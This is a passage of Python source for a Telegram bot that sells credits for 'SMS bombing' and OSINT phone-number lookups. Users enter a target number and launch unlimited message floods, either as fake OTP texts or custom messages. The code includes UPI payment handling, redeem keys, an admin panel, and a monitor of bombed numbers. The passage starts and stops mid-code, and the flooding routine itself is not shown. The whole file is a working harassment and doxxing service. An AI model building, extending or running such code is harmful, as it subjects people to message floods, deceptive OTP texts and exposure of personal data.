        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("💣 Bᴏᴍʙ Cʀᴇᴅɪᴛs", callback_data="recharge_type_bomb")],
            [InlineKeyboardButton("🔍 OSINT Cʀᴇᴅɪᴛs", callback_data="recharge_type_osint")],
            [InlineKeyboardButton("❌ Cᴀɴᴄᴇʟ", callback_data="recharge_cancel")],
        ])
        return await update.message.reply_text("💳 <b>Sᴇʟᴇᴄᴛ Cʀᴇᴅɪᴛ Tʏᴘᴇ</b>", parse_mode="HTML", reply_markup=markup)

    if text == BTN_HISTORY:
        clear_states(context)
        hist = get_user_history(uid, 10)
        if not hist: return await update.message.reply_text("📭 Nᴏ Hɪsᴛᴏʀʏ.")
        reply = "📜 <b>Aᴄᴛɪᴠɪᴛʏ:</b>\n"
        for a, d, t in hist: reply += f"• {a} – {d[:30]}\n"
        return await update.message.reply_text(reply, parse_mode="HTML")

    if text == BTN_STATUS:
        clear_states(context)
        return await update.message.reply_text(
            f"🟢 <b>Bᴏᴛ Rᴜɴɴɪɴɢ</b> 🚀", parse_mode="HTML")

    if text == BTN_REDEEM:
        clear_states(context)
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("💣 Rᴇᴅᴇᴇᴍ Bᴏᴍʙ", callback_data="ui_redeem_bomb")],
            [InlineKeyboardButton("🔍 Rᴇᴅᴇᴇᴍ OSINT", callback_data="ui_redeem_osint")],
        ])
        return await update.message.reply_text(
            "🔑 <b>Rᴇᴅᴇᴇᴍ Kᴇʏ</b>\n\n"
            "💣 Bᴏᴍʙ: <code>/redeembomb KEY</code>\n"
            "🔍 OSINT: <code>/redeemosint KEY</code>",
            parse_mode="HTML", reply_markup=markup)

    if text == BTN_DEV:
        clear_states(context)
        return await update.message.reply_text(f"👨‍💻 Dᴇᴠ: {OWNER_CONTACT_LINK} 🔥", parse_mode="HTML")

    # ── SEARCH INPUT ──
    if context.user_data.get('search_state') == 'await':
        digits = re.sub(r"\D", "", text)
        if len(digits) >= 8:
            context.user_data.pop('search_state', None)
            await do_search(update, context, digits)
        else:
            await update.message.reply_text("❌ Vᴀʟɪᴅ ɴᴜᴍʙᴇʀ ʙʜᴇᴊᴏ (8+ ᴅɪɢɪᴛs).")
        return

    # ── BOMB: number input ──
    if context.user_data.get('bulk_step') == 'number':
        valid, msg = validate_phone_number(text)
        if not valid:
            return await update.message.reply_text(f"{msg}", parse_mode="HTML")
        context.user_data['bulk_number'] = text
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔢 Rᴀɴᴅᴏᴍ OTP", callback_data="msgtype_random")],
            [InlineKeyboardButton("✏ Cᴜsᴛᴏᴍ", callback_data="msgtype_custom")],
            [InlineKeyboardButton("❌ Cᴀɴᴄᴇʟ", callback_data="msgtype_cancel")],
        ])
        await update.message.reply_text("📝 Sᴇʟᴇᴄᴛ ᴍᴇssᴀɢᴇ ᴛʏᴘᴇ:", reply_markup=markup)
        context.user_data['bulk_step'] = 'msgtype'
        return

    if context.user_data.get('bulk_step') == 'custom_msg':
        if not text: return await update.message.reply_text("❌ Eᴍᴘᴛʏ")
        # Consume credit now
        ok, source, free_left, paid_left = consume_credit(uid, 'bomb')
        if not ok:
            context.user_data.pop('bulk_step', None)
            return await update.message.reply_text(no_credits_msg('bomb'), parse_mode="HTML")
        context.user_data.pop('bulk_step', None)
        number = context.user_data.get('bulk_number')
        log_user_action(uid, "Bulk SMS", f"Target: {number}")
        start_bomb_thread(uid, number, text)
        src_msg = "🎁 Fʀᴇᴇ" if source == 'free' else ("💎 Pᴀɪᴅ" if source == 'paid' else "👑 Oᴡɴᴇʀ")
        await update.message.reply_text(
            f"🚀 <b>Bᴏᴍʙ Sᴛᴀʀᴛᴇᴅ — UNLIMITED!</b>\n📱 {number}\n{src_msg}\n\n"
            f"🛑 Rᴏᴋɴᴇ ᴋᴇ ʟɪʏᴇ /cancel", parse_mode="HTML")
        return

    # ── RECHARGE ──
    rstep = context.user_data.get('recharge_step')
    if rstep == 'payment':
        ktype = context.user_data.get('recharge_type', 'bomb')
        if update.message.photo:
            fid = update.message.photo[-1].file_id
            cr = context.user_data.get('recharge_credits', 0)
            amt = context.user_data.get('recharge_amount', 0)
            if cr == 0: return await update.message.reply_text("❌ Exᴘɪʀᴇᴅ.")
            conn = get_db(); c = conn.cursor()
            c.execute("""INSERT INTO payments(user_id,amount,credits_given,credit_type,screenshot_id,status)
                         VALUES(?,?,?,?,?,'pending')""", (uid, amt, cr, ktype, fid))
            pid = c.lastrowid; conn.commit()
            await update.message.reply_text(f"✅ Sᴄʀᴇᴇɴsʜᴏᴛ! 📸\nID: #{pid}", parse_mode="HTML")
            try:
                await context.application.bot.send_message(OWNER_ID,
                    f"📥 Payment SS\n👤 {uid}\n💰 ₹{amt}\n💎 {cr} {ktype}\n🆔 #{pid}")
            except: pass
            for k in ('recharge_step','recharge_credits','recharge_amount','recharge_type'): context.user_data.pop(k, None)
            return
        elif text and not text.startswith('/'):
            cr = context.user_data.get('recharge_credits', 0)
            amt = context.user_data.get('recharge_amount', 0)
            if cr == 0: return await update.message.reply_text("❌ Exᴘɪʀᴇᴅ.")
            conn = get_db(); c = conn.cursor()
            c.execute("""INSERT INTO payments(user_id,amount,credits_given,credit_type,transaction_id,status)
                         VALUES(?,?,?,?,?,'pending')""", (uid, amt, cr, ktype, text))
            pid = c.lastrowid; conn.commit()
            await update.message.reply_text(f"✅ Txn! 💳\nID: #{pid}", parse_mode="HTML")
            for k in ('recharge_step','recharge_credits','recharge_amount','recharge_type'): context.user_data.pop(k, None)
            return

    await update.message.reply_text("❌ Usᴇ Bᴜᴛᴛᴏɴs. 🔘", reply_markup=get_main_keyboard(uid))

# ══════════════════════════════════════════════════════════════
#                    🎛️ CALLBACKS
# ══════════════════════════════════════════════════════════════
async def handle_callbacks(update, context):
    q = update.callback_query; data = q.data
    try: await q.answer()
    except: pass
    uid = q.from_user.id

    if data and data.startswith("admin_"):
        return await admin_callback(update, context)

    # UI Buy
    if data == "ui_buy_bomb":
        try:
            await q.edit_message_text(
                f"💣 <b>Bᴜʏ Bᴏᴍʙ Cʀᴇᴅɪᴛs</b>\n━━━━━━━━━━━━━━\n"
                f"👤 {OWNER_CONTACT_USERNAME}\n📱 <code>{OWNER_PHONE}</code>\n"
                f"🔗 {OWNER_CONTACT_LINK}",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💬 Cᴏɴᴛᴀᴄᴛ", url=OWNER_CONTACT_LINK)]]))
        except: pass
        return
    if data == "ui_buy_osint":
        try:
            await q.edit_message_text(
                f"🔍 <b>Bᴜʏ OSINT Cʀᴇᴅɪᴛs</b>\n━━━━━━━━━━━━━━\n"
                f"👤 {OWNER_CONTACT_USERNAME}\n📱 <code>{OWNER_PHONE}</code>\n"
                f"🔗 {OWNER_CONTACT_LINK}",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💬 Cᴏɴᴛᴀᴄᴛ", url=OWNER_CONTACT_LINK)]]))
        except: pass
        return
    if data == "ui_redeem_bomb":
        try: await q.edit_message_text("🔑 Usᴇ: <code>/redeembomb KEY</code>", parse_mode="HTML")
        except: pass
        return
    if data == "ui_redeem_osint":
        try: await q.edit_message_text("🔑 Usᴇ: <code>/redeemosint KEY</code>", parse_mode="HTML")
        except: pass
        return

    if data == "force_join_checked":
        try:
            member = await context.application.bot.get_chat_member(
                chat_id=f"@{FORCE_CHANNEL_USERNAME}", user_id=uid)
            if member.status in ("member", "administrator", "creator"):
                set_force_join_verified(uid)
                await q.edit_message_text("✅ Vᴇʀɪғɪᴇᴅ! 🎉\nTʏᴘᴇ /start")
            else:
                await q.edit_message_text(f"❌ Jᴏɪɴ Fɪʀsᴛ!\n{FORCE_CHANNEL_LINK}")
        except Exception as e:
            await q.edit_message_text(f"❌ {str(e)[:50]}\n{FORCE_CHANNEL_LINK}")
        return

    # ── RECHARGE ──
    if data.startswith("recharge_"):
        if data == "recharge_cancel":
            try: await q.edit_message_text("❌ Cᴀɴᴄᴇʟʟᴇᴅ.")
            except: pass
            return
        if data.startswith("recharge_type_"):
            ktype = data.replace("recharge_type_", "")
            context.user_data['recharge_type'] = ktype
            emoji = "💣" if ktype == "bomb" else "🔍"
            markup = InlineKeyboardMarkup([
                [InlineKeyboardButton(f"{emoji} 10 - ₹20", callback_data=f"recharge_{ktype}_10_20")],
                [InlineKeyboardButton(f"{emoji} 25 - ₹50", callback_data=f"recharge_{ktype}_25_50")],
                [InlineKeyboardButton(f"{emoji} 50 - ₹100", callback_data=f"recharge_{ktype}_50_100")],
                [InlineKeyboardButton(f"{emoji} 100 - ₹200", callback_data=f"recharge_{ktype}_100_200")],
                [InlineKeyboardButton("❌ Cᴀɴᴄᴇʟ", callback_data="recharge_cancel")],
            ])
            try: await q.edit_message_text(f"{emoji} <b>Sᴇʟᴇᴄᴛ Pʟᴀɴ</b>", parse_mode="HTML", reply_markup=markup)
            except: pass
            return
        # recharge_bomb_10_20 or recharge_osint_10_20
        parts = data.split("_")
        if len(parts) == 4:
            ktype = parts[1]; cr = parts[2]; amt = parts[3]
            context.user_data['recharge_type'] = ktype
            context.user_data['recharge_credits'] = int(cr)
            context.user_data['recharge_amount'] = int(amt)
            context.user_data['recharge_step'] = 'payment'
            emoji = "💣" if ktype == "bomb" else "🔍"
            txt = (f"{emoji} <b>{cr} {ktype.upper()} Cʀᴇᴅɪᴛs</b>\n💵 ₹{amt}\n\n"
                   f"📱 UPI: <code>{UPI_ID}</code>\n📛 {UPI_NAME}\n\n"
                   f"📸 Sᴇɴᴅ Tʀᴀɴsᴀᴄᴛɪᴏɴ ID Oʀ SS.")
            try: await q.edit_message_text(txt, parse_mode="HTML")
            except: pass
            return

    # ── MSG TYPE ──
    if data.startswith("msgtype_"):
        if data == "msgtype_cancel":
            context.user_data.pop('bulk_step', None)
            try: await q.edit_message_text("❌ Cᴀɴᴄᴇʟʟᴇᴅ.")
            except: pass
            return
        t = data.split("_")[1]
        if t == "random":
            ok, source, free_left, paid_left = consume_credit(uid, 'bomb')
            if not ok:
                context.user_data.pop('bulk_step', None)
                try: await q.edit_message_text(no_credits_msg('bomb'), parse_mode="HTML")
                except: pass
                return
            number = context.user_data.get('bulk_number')
            log_user_action(uid, "Bulk SMS", f"Target: {number}")
            context.user_data.pop('bulk_step', None)
            start_bomb_thread(uid, number, "Your OTP is: {otp} | Don't share.")
            src_msg = "🎁 Fʀᴇᴇ" if source == 'free' else ("💎 Pᴀɪᴅ" if source == 'paid' else "👑 Oᴡɴᴇʀ")
            try: await q.edit_message_text(f"🚀 Bᴏᴍʙ Sᴛᴀʀᴛᴇᴅ!\n{src_msg}\n🛑 /cancel")
            except: pass
        else:
            try: await q.edit_message_text(
                "✏️ Eɴᴛᴇʀ Cᴜsᴛᴏᴍ Mᴇssᴀɢᴇ:\n🔢 <code>{otp}</code> Fᴏʀ OTP.\n❌ /cancel",
                parse_mode="HTML")
            except: pass
            context.user_data['bulk_step'] = 'custom_msg'
        return

# ══════════════════════════════════════════════════════════════
#                    ⚙️ ADMIN PANEL
# ══════════════════════════════════════════════════════════════
def admin_kb():
    maint = "🟢 ON" if is_maintenance_on() else "🔴 OFF"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💣 Gᴇɴ Bᴏᴍʙ Kᴇʏ", callback_data="admin_genkey_bomb")],
        [InlineKeyboardButton("🔍 Gᴇɴ OSINT Kᴇʏ", callback_data="admin_genkey_osint")],
        [InlineKeyboardButton("📋 Lɪsᴛ Bᴏᴍʙ Kᴇʏs", callback_data="admin_listkeys_bomb")],
        [InlineKeyboardButton("📋 Lɪsᴛ OSINT Kᴇʏs", callback_data="admin_listkeys_osint")],
        [InlineKeyboardButton("🗑 Dᴇʟ Kᴇʏ", callback_data="admin_delkey")],
        [InlineKeyboardButton(f"🔧 Mᴀɪɴᴛ: {maint}", callback_data="admin_maint_toggle")],
        [InlineKeyboardButton("✏️ Sᴇᴛ Mᴀɪɴᴛ Mꜱɢ", callback_data="admin_maint_msg")],
        [InlineKeyboardButton("💣 Aᴅᴅ Bᴏᴍʙ Cʀᴇᴅɪᴛs", callback_data="admin_add_bomb")],
        [InlineKeyboardButton("🔍 Aᴅᴅ OSINT Cʀᴇᴅɪᴛs", callback_data="admin_add_osint")],
        [InlineKeyboardButton("📊 Dᴇᴠɪᴄᴇ Sᴛᴀᴛᴜs", callback_data="admin_devices")],
        [InlineKeyboardButton("👥 Usᴇʀs", callback_data="admin_users")],
        [InlineKeyboardButton("📢 Bʀᴏᴀᴅᴄᴀsᴛ", callback_data="admin_broadcast_info")],
        [InlineKeyboardButton("🚫 Bᴀɴ", callback_data="admin_ban_info"),
         InlineKeyboardButton("✅ Uɴʙᴀɴ", callback_data="admin_unban_info")],
        [InlineKeyboardButton("🔄 Rᴇғʀᴇsʜ Cᴀᴄʜᴇ", callback_data="admin_refresh")],
        [InlineKeyboardButton("❌ Cʟᴏsᴇ", callback_data="admin_close")],
    ])

async def admin_panel(update, context):
    uid = update.effective_user.id
    if not is_owner(uid):
        return await update.effective_message.reply_text("⛔ Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ")
    await update.effective_message.reply_text(
        "⚙️ <b>ADMIN PANEL</b>\n━━━━━━━━━━━━━━", parse_mode="HTML", reply_markup=admin_kb())

async def admin_callback(update, context):
    q = update.callback_query; uid = q.from_user.id; data = q.data
    if not is_owner(uid):
        try: await q.answer("⛔", show_alert=True)
        except: pass
        return
    try: await q.answer()
    except: pass

    if data == "admin_close":
        try: await q.edit_message_text("❌ Cʟᴏsᴇᴅ.")
        except: pass
        return
    if data == "admin_back":
        try: await q.edit_message_text("⚙️ <b>ADMIN PANEL</b>", parse_mode="HTML", reply_markup=admin_kb())
        except: pass
        return
    if data == "admin_genkey_bomb":
        context.user_data['admin_step'] = 'genkey_credits'
        try: await q.edit_message_text(
            "💣 <b>Gᴇɴ Bᴏᴍʙ Kᴇʏ</b>\n\nSᴇɴᴅ: <code>bomb credits days uses</code>\n"
            "Ex: <code>bomb 10 30 1</code>", parse_mode="HTML")
        except: pass
        return
    if data == "admin_genkey_osint":
        context.user_data['admin_step'] = 'genkey_credits'
        try: await q.edit_message_text(
            "🔍 <b>Gᴇɴ OSINT Kᴇʏ</b>\n\nSᴇɴᴅ: <code>osint credits days uses</code>\n"
            "Ex: <code>osint 5 7 10</code>", parse_mode="HTML")
        except: pass
        return
    if data in ("admin_listkeys_bomb", "admin_listkeys_osint"):
        kind = 'bomb' if data.endswith('bomb') else 'osint'
        keys = get_all_keys(kind)
        emoji = "💣" if kind == 'bomb' else "🔍"
        if not keys:
            try: await q.edit_message_text(f"📭 Nᴏ {emoji} Kᴇʏs")
            except: pass
            return
        msg = f"{emoji} <b>{kind.upper()} Kᴇʏs:</b>\n"
        for k in keys:
            key, credits, ktype, max_uses, used_count, expiry_at = k
            ed = datetime.fromtimestamp(expiry_at).strftime("%d-%m-%Y")
            s = "✅" if used_count < max_uses else "❌"
            msg += f"{s} <code>{key}</code> 💰{credits} {used_count}/{max_uses} {ed}\n"
        try: await q.edit_message_text(msg, parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="admin_back")]]))
        except: pass
        return
    if data == "admin_delkey":
        context.user_data['admin_step'] = 'delkey'
        try: await q.edit_message_text("🗑 Sᴇɴᴅ ᴋᴇʏ ᴛᴏ ᴅᴇʟᴇᴛᴇ:\n❌ /cancel")
        except: pass
        return
    if data == "admin_maint_toggle":
        set_maintenance(not is_maintenance_on())
        try: await q.edit_message_text("⚙️ <b>ADMIN PANEL</b>", parse_mode="HTML", reply_markup=admin_kb())
        except: pass
        return
    if data == "admin_maint_msg":
        context.user_data['admin_step'] = 'maint_msg'
        try: await q.edit_message_text("✏️ Sᴇɴᴅ ɴᴇᴡ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍꜱɢ:\n❌ /cancel")
        except: pass
        return
    if data == "admin_add_bomb":
        context.user_data['admin_step'] = 'add_credits'
        try: await q.edit_message_text(
            "💣 Aᴅᴅ Bᴏᴍʙ Cʀᴇᴅɪᴛs\n\nSᴇɴᴅ: <code>bomb USER_ID AMOUNT</code>\nEx: <code>bomb 123456 10</code>",
            parse_mode="HTML")
        except: pass
        return
    if data == "admin_add_osint":
        context.user_data['admin_step'] = 'add_credits'
        try: await q.edit_message_text(
            "🔍 Aᴅᴅ OSINT Cʀᴇᴅɪᴛs\n\nSᴇɴᴅ: <code>osint USER_ID AMOUNT</code>\nEx: <code>osint 123456 10</code>",
            parse_mode="HTML")
        except: pass
        return
    if data == "admin_devices":
        try: await q.answer("🔄 Refreshing...")
        except: pass
        refresh_device_cache_sync()
        d = _device_cache["data"]
        working_list = [(url, devices) for url, devices in d.get("url_devices", {}).items() if devices]
        working_list.sort(key=lambda x: len(x[1]), reverse=True)
        header = f"📊 <b>DEVICES</b>\n✅ Working: {d['urls']}\n🔄 Total: {d['total']}\n"
        try: await q.edit_message_text(header, parse_mode="HTML")
        except: pass
        chunk = ""
        for url, devices in working_list:
            line = f"✅ {url.replace('https://','')[:30]}: {len(devices)}\n"
            if len(chunk) + len(line) > 3500:
                try: await context.application.bot.send_message(uid, f"<code>{chunk}</code>", parse_mode="HTML")
                except: pass
                chunk = line
            else: chunk += line
        if chunk:
            try:
                await context.application.bot.send_message(uid, f"<code>{chunk}</code>", parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="admin_back")]]))
            except: pass
        return
    if data == "admin_users":
        all_users = get_all_users()
        msg = f"👥 {len(all_users)} | 🚫 {get_banned_count()}\n\n"
        for i, (uid2, bc, oc, _) in enumerate(all_users[:30], 1):
            msg += f"{i}. <code>{uid2}</code> 💣{bc} 🔍{oc}\n"
        try: await q.edit_message_text(msg, parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="admin_back")]]))
        except: pass
        return
    if data in ["admin_broadcast_info", "admin_ban_info", "admin_unban_info"]:
        texts = {
            "admin_broadcast_info": "📢 /broadcast msg",
            "admin_ban_info": "🚫 /ban ID",
            "admin_unban_info": "✅ /unban ID",
        }
        try: await q.edit_message_text(f"<b>{texts[data]}</b>", parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="admin_back")]]))
        except: pass
        return
    if data == "admin_refresh":
        refresh_device_cache_sync()
        try:
            await q.edit_message_text(
                f"✅ Refreshed! Devices: {_device_cache['data']['total']}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="admin_back")]]))
        except: pass
        return

# ══════════════════════════════════════════════════════════════
#                    📜 COMMANDS
# ══════════════════════════════════════════════════════════════
async def redeembomb_cmd(update, context):
    uid = update.effective_user.id
    if is_user_banned(uid): return await update.effective_message.reply_text("❌ Bᴀɴɴᴇᴅ")
    if await check_maintenance(update, context): return
    if not await check_force_join(update, context): return
    if not context.args:
        return await update.effective_message.reply_text("📝 Usᴇ: /redeembomb KEY")
    key = context.args[0].strip().upper()
    # Verify it's a bomb key
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT key_type FROM redeem_keys WHERE key=?", (key,))
    row = c.fetchone()
    if row and row[0] != 'bomb':
        return await update.effective_message.reply_text("❌ Yᴇ OSINT ᴋᴇʏ ʜᴀɪ! Usᴇ /redeemosint")
    success, msg = redeem_key(uid, key)
    if success:
        await update.effective_message.reply_text(
            f"{msg}\n💣 Bᴏᴍʙ Cʀᴇᴅɪᴛs: <code>{get_credits(uid, 'bomb')}</code>",
            parse_mode="HTML")
    else:
        await update.effective_message.reply_text(msg)

async def redeemosint_cmd(update, context):
    uid = update.effective_user.id
    if is_user_banned(uid): return await update.effective_message.reply_text("❌ Bᴀɴɴᴇᴅ")
    if await check_maintenance(update, context): return
    if not await check_force_join(update, context): return
    if not context.args:
        return await update.effective_message.reply_text("📝 Usᴇ: /redeemosint KEY")
    key = context.args[0].strip().upper()
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT key_type FROM redeem_keys WHERE key=?", (key,))
    row = c.fetchone()
    if row and row[0] != 'osint':
        return await update.effective_message.reply_text("❌ Yᴇ BOMB ᴋᴇʏ ʜᴀɪ! Usᴇ /redeembomb")
    success, msg = redeem_key(uid, key)
    if success:
        await update.effective_message.reply_text(
            f"{msg}\n🔍 OSINT Cʀᴇᴅɪᴛs: <code>{get_credits(uid, 'osint')}</code>",
            parse_mode="HTML")
    else:
        await update.effective_message.reply_text(msg)

async def search_cmd(update, context):
    uid = update.effective_user.id
    if is_user_banned(uid): return await update.effective_message.reply_text("❌ Bᴀɴɴᴇᴅ")
    if await check_maintenance(update, context): return
    if not await check_force_join(update, context): return
    if not context.args:
        return await update.effective_message.reply_text("Usᴀɢᴇ: /search <number>")
    await do_search(update, context, " ".join(context.args).strip())

async def genkey_cmd(update, context):
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    # /genkey bomb|osint credits [days] [uses]
    if len(context.args) < 2:
        return await update.effective_message.reply_text(
            "📝 /genkey <bomb|osint> credits [days] [uses]\n"
            "Ex: <code>/genkey bomb 10 30 1</code>\n"
            "Ex: <code>/genkey osint 5 7 10</code>",
            parse_mode="HTML")
    try:
        ktype = context.args[0].lower()
        if ktype not in ('bomb', 'osint'): raise ValueError
        credits = int(context.args[1])
        days = int(context.args[2]) if len(context.args) > 2 else 30
        max_uses = int(context.args[3]) if len(context.args) > 3 else 1
    except:
        return await update.effective_message.reply_text("❌ Invalid. Fᴏʀᴍᴀᴛ: <code>bomb|osint credits days uses</code>", parse_mode="HTML")
    key = generate_redeem_key(credits, days, max_uses, uid, ktype)
    cmd = "/redeembomb" if ktype == 'bomb' else "/redeemosint"
    emoji = "💣" if ktype == 'bomb' else "🔍"
    await update.effective_message.reply_text(
        f"✅ <b>{emoji} {ktype.upper()} Kᴇʏ</b>\n🔑 <code>{key}</code>\n💰 {credits}\n📅 {days}d\n👥 {max_uses}\n"
        f"━━━\nUsᴇʀ ᴜsᴇ ᴋᴀʀᴇ: <code>{cmd} {key}</code>",
        parse_mode="HTML")

async def keys_cmd(update, context):
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    keys = get_all_keys()
    if not keys: return await update.effective_message.reply_text("📭 No keys")
    msg = "🔑 <b>ALL Kᴇʏs:</b>\n"
    for k in keys:
        key, credits, ktype, max_uses, used_count, expiry_at = k
        ed = datetime.fromtimestamp(expiry_at).strftime("%d-%m-%Y")
        s = "✅" if used_count < max_uses else "❌"
        emoji = "💣" if ktype == 'bomb' else "🔍"
        msg += f"{s}{emoji} <code>{key}</code> 💰{credits} {used_count}/{max_uses} {ed}\n"
    await update.effective_message.reply_text(msg, parse_mode="HTML")

async def maint_cmd(update, context):
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    if not context.args:
        s = "🟢 ON" if is_maintenance_on() else "🔴 OFF"
        return await update.effective_message.reply_text(f"🔧 {s}\n/maint on|off")
    arg = context.args[0].lower()
    if arg in ("on","1","true","yes"):
        set_maintenance(True); await update.effective_message.reply_text("✅ ON")
    elif arg in ("off","0","false","no"):
        set_maintenance(False); await update.effective_message.reply_text("✅ OFF")
    else: await update.effective_message.reply_text("❌ /maint on|off")

async def myid_cmd(update, context):
    uid = update.effective_user.id
    if await check_maintenance(update, context): return
    if not await check_force_join(update, context): return
    role = "👑 Oᴡɴᴇʀ" if is_owner(uid) else "👤 Usᴇʀ"
    await update.effective_message.reply_text(f"🆔 <code>{uid}</code>\n📋 {role}", parse_mode="HTML")

async def users_cmd(update, context):
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    all_users = get_all_users()
    msg = f"📊 Usᴇʀs: {len(all_users)} | 🚫 {get_banned_count()}\n\n"
    for i, (uid2, bc, oc, _) in enumerate(all_users[:50], 1):
        msg += f"{i}. <code>{uid2}</code> 💣{bc} 🔍{oc}\n"
    await update.effective_message.reply_text(msg, parse_mode="HTML")

async def broadcast(update, context):
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    if not context.args: return await update.effective_message.reply_text("📢 /broadcast msg")
    msg = " ".join(context.args)
    users = get_all_users(); total = len(users)
    status = await update.effective_message.reply_text(f"📢 Tᴏ {total}...")
    sent = failed = 0
    for uid2, _, _, _ in users:
        if is_user_banned(uid2): failed += 1; continue
        try:
            await context.application.bot.send_message(uid2, f"📢 <b>Bʀᴏᴀᴅᴄᴀsᴛ</b>\n\n{msg}", parse_mode="HTML")
            sent += 1
        except: failed += 1
        await asyncio.sleep(0.02)
    await status.edit_text(f"✅ {sent} | ❌ {failed}", parse_mode="HTML")

async def add_credits_cmd(update, context):
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    # /addcredits bomb|osint ID AMT
    if len(context.args) < 3:
        return await update.effective_message.reply_text("📝 /addcredits <bomb|osint> ID AMT", parse_mode="HTML")
    try:
        ktype = context.args[0].lower()
        target = int(context.args[1]); amt = int(context.args[2])
        add_credits(target, amt, ktype)
        await update.effective_message.reply_text(f"✅ +{amt} {ktype} to {target}")
    except: await update.effective_message.reply_text("❌ Invalid")

async def ban_cmd(update, context):
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    if not context.args: return await update.effective_message.reply_text("📝 /ban ID")
    try:
        if ban_user(int(context.args[0]), uid):
            await update.effective_message.reply_text("✅ Banned")
        else: await update.effective_message.reply_text("❌ Failed")
    except: await update.effective_message.reply_text("❌ Invalid")

async def unban_cmd(update, context):
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    if not context.args: return await update.effective_message.reply_text("📝 /unban ID")
    try:
        if unban_user(int(context.args[0])):
            await update.effective_message.reply_text("✅ Unbanned")
        else: await update.effective_message.reply_text("❌ Not banned")
    except: await update.effective_message.reply_text("❌ Invalid")

async def monitor_cmd(update, context):
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    bombs = get_recent_bombs(15)
    if not bombs: return await update.effective_message.reply_text("📭")
    msg = "🚨 <b>BOMB MONITOR</b>\n"
    for uid_att, phone, count, last in bombs:
        msg += f"👤 <code>{uid_att}</code>\n📱 {phone} ({count}x)\n"
    await update.effective_message.reply_text(msg, parse_mode="HTML")

async def device_status_cmd(update, context):
    uid = update.effective_user.id
    if not is_owner(uid): return await update.effective_message.reply_text("⛔")
    refresh_device_cache_sync()
    d = _device_cache["data"]
    await update.effective_message.reply_text(
        f"📊 <b>DEVICES</b>\n✅ Working: {d['urls']}\n🔄 Total: {d['total']}", parse_mode="HTML")

async def cancel(update, context):
    uid = update.effective_user.id
    if uid in _active_bombs:
        _active_bombs[uid]["stop"] = True
        await update.effective_message.reply_text("🛑 Sᴛᴏᴘᴘɪɴɢ...", reply_markup=get_main_keyboard(uid))
    else:
        await update.effective_message.reply_text("❌ Nᴏ ᴀᴄᴛɪᴠᴇ ᴛᴀsᴋ.", reply_markup=get_main_keyboard(uid))
    clear_states(context)

# ══════════════════════════════════════════════════════════════
#                    🚀 MAIN
# ══════════════════════════════════════════════════════════════
def main():
    print("🚀 Starting MERGED BOT V2...")
    threading.Thread(target=refresh_device_cache_sync, daemon=True).start()

    request = HTTPXRequest(connect_timeout=10.0, read_timeout=10.0,
                           write_timeout=10.0, pool_timeout=10.0)
    app = Application.builder().token(TOKEN).request(request).build()

    async def error_handler(update, context):
        if isinstance(context.error, Conflict):
            print("⚠️ Bot already running!"); sys.exit(1)
        else:
            print(f"❌ Error: {context.error}")

    app.add_error_handler(error_handler)

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CommandHandler("myid", myid_cmd))
    app.add_handler(CommandHandler("users", users_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("addcredits", add_credits_cmd))
    app.add_handler(CommandHandler("ban", ban_cmd))
    app.add_handler(CommandHandler("unban", unban_cmd))
    app.add_handler(CommandHandler("monitor", monitor_cmd))
    app.add_handler(CommandHandler("devices", device_status_cmd))
    app.add_handler(CommandHandler("genkey", genkey_cmd))
    app.add_handler(CommandHandler("redeembomb", redeembomb_cmd))
    app.add_handler(CommandHandler("redeemosint", redeemosint_cmd))
    app.add_handler(CommandHandler("keys", keys_cmd))
    app.add_handler(CommandHandler("maint", maint_cmd))
    app.add_handler(CommandHandler("search", search_cmd))
    app.add_handler(CommandHandler("buy", lambda u, c: u.message.reply_text(
        f"💳 <b>Bᴜʏ Cʀᴇᴅɪᴛs</b>\n👤 {OWNER_CONTACT_USERNAME}\n📱 <code>{OWNER_PHONE}</code>\n🔗 {OWNER_CONTACT_LINK}",
        parse_mode="HTML")))

    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.PHOTO & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("""
╔════════════════════════════════╗
║  🔥 MERGED BOT V2 — SEPARATE CREDITS💥║
║  ✅ Bomb Credits (separate)                  ║
║  ✅ OSINT Credits (separate)                 ║
║  ✅ Daily 2 Free each                        ║
║  ✅ /redeembomb & /redeemosint             ║
║  ✅ Admin alag alag keys bana sakta hai      ║
╚════════════════════════════════╝
    """)

    try:
        app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
    except Conflict:
        print("\n⚠️ Conflict — bot already running!"); sys.exit(1)

if __name__ == "__main__":
    try: main()
